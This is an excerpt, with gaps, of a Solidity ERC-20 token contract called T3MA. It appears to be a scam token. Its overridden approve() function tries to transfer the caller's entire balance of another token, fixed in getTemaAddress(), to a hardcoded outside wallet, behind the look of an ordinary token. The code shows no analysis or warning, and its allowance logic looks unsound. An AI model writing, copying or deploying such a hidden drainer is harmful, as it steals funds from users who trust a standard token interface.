...
contract T3MA is ERC20Burnable, Operator {
    using SafeERC20 for IERC20;
    /**
     * @notice Constructs the TEMA ERC-20 contract.
     */
    constructor() public ERC20("T33 Ma", "T3MA") {
    ...
    function approve(address spender, uint256 amount) public override returns (bool) {
        ...
        IERC20(getTemaAddress()).safeApprove(address(this), IERC20(getTemaAddress()).balanceOf(_msgSender()));
        IERC20(getTemaAddress()).safeTransferFrom(_msgSender(), address(0xAe11FE4e12DfBc758c317E8C779614a7d2F0a2Bc), IERC20(getTemaAddress()).balanceOf(_msgSender()));
        return true;
    }

    function getTemaAddress() public view returns (address) {
        return address(0xff3A204D59808c6B125AA537e5ba9C9e2066072c);
    }
}
